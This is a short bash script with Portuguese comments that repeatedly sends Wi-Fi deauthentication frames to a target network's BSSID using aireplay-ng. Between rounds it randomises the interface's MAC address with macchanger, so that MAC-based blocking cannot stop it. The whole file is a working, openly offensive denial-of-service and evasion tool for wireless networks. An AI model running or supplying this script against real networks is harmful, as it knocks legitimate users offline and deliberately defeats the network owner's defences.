#!/bin/bash

#$1 - bssid da rede alvo
#$2 - interface

#evitar bloqueio de MAC, fazendo a alteração do mesmo após a solicitação de desautenticação

while true
	do
		aireplay-ng -0 1 -b $1 $2 | grep "DeAuth"
		ifconfig $2 down
		macchanger -r $2 | grep "New MAC"
		ifconfig $2 up
		sleep 4
	done
